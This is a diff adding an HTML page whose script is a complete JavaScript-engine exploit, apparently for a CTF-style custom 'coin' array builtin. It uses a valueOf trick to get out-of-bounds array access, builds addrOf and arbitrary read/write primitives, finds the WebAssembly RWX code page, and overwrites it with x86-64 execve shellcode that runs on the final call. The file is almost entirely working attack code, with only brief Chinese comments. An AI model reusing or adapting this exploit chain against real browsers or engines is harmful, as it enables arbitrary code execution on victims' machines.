@@ -1,0 +1,147 @@
+<script>
+var buf =new ArrayBuffer(16);
+var float64 = new Float64Array(buf);
+var bigUint64 = new BigUint64Array(buf);
+const buf8 = new ArrayBuffer(8);
+const f64 = new Float64Array(buf8);
+const u32 = new Uint32Array(buf8);
+function f2i(val)
+{ //double ==> Uint64
+    f64[0] = val;
+    let tmp = Array.from(u32);
+    return tmp[1] * 0x100000000 + tmp[0];
+}
+function i2f(val)
+{ //Uint64 ==> double
+    let tmp = [];
+    tmp[0] = parseInt(val % 0x100000000);
+    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
+    u32.set(tmp);
+    return f64[0];
+}
+
+function test() {
+    var wasmImports = {
+        env: {
+            puts: function puts (index) {
+                print(utf8ToString(h, index));
+            }
+        }
+    };
+    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
+        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
+        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
+        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
+        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
+        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
+        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
+    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
+    let h = new Uint8Array(m.exports.memory.buffer);
+    return m.exports.hello;
+}
+
+func = test();
+
+
+function hex(i)
+{
+    return i.toString(16).padStart(16, "0");
+}
+function print(i)
+{
+    console.log(i);
+}
+
+var array = new Array(30);
+var float_array = [1.1, 2.2];
+var obj = {mark:i2f(0xdeadbeef), a:func,b:func,c:func};
+var array_buffer = new ArrayBuffer(0x200);
+var len = {
+    valueOf:function()
+    {
+        array.length = 0x1000;
+        return 0xabcd;
+    }
+};
+
+array.coin(len, 0xdead);
+
+var dv = new DataView(array_buffer);
+
+var array_to_obj_offset = 0;
+var array_to_buffer_offset = 0;
+
+for(let i = 0; i < 0x100; i++)
+{
+    let d = f2i(float_array[i]);
+    if(d == 0xdeadbeef)
+    {
+        array_to_obj_offset = i + 1;
+        print("[+] find array_to_obj_offset " + array_to_obj_offset.toString());
+        break;
+    }
+}
+
+for(let i = array_to_obj_offset; i < 0x100; i++)
+{
+    let d = f2i(float_array[i]);
+    if(d == 0x200)
+    {
+        array_to_buffer_offset = i + 1;
+        print("[+] find array_to_buffer_offset " + array_to_buffer_offset.toString());
+        break;
+    }
+}
+
+function addrOf(val)
+{
+    obj.a = val;
+    return f2i(float_array[array_to_obj_offset]) - 1;
+}
+
+// 第二次使用read会遇到addr没办法写到float_array[array_to_buffer_offset]的问题
+//因为中间的时候栈上有个地方本应该是地址，但是却不知为何变成了一个字节的数字
+function read(addr)
+{
+    print("[+] read from " + hex(addr));
+    float_array[array_to_buffer_offset] = i2f(addr);
+    return f2i(dv.getFloat64(0, true));
+}
+
+function write(addr, data)
+{
+    print("[+] write " + hex(data) + " to " + hex(addr))
+    float_array[array_to_buffer_offset] = i2f(addr + 1);
+    dv.setFloat64(0, i2f(data), true);
+}
+
+// 从这开始，就是大佬的操作了
+var wasm_code=f2i(float_array[array_to_obj_offset])-0x189;
+
+float_array[array_to_buffer_offset]=i2f(wasm_code);
+for(let i=0;i<40;i++)
+{
+    tmp_addr=f2i(dv.getFloat64(i*8, true));
+    print(hex(wasm_code));
+    if(tmp_addr%0x1000==0&&tmp_addr/0x1000>0x1000&&tmp_addr&0xff0000){
+        wasm_code=tmp_addr;
+        break;
+    }
+}
+console.log("[+] wasm code address 0x" + hex(wasm_code));
+
+float_array[array_to_buffer_offset]=i2f(wasm_code);
+
+let shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
+    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
+    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
+    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
+    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
+    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
+    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
+for (let i = 0; i < shellcode.length; i++) {
+    dv.setUint8(i, shellcode[i]);
+}
+
+func();
+</script>
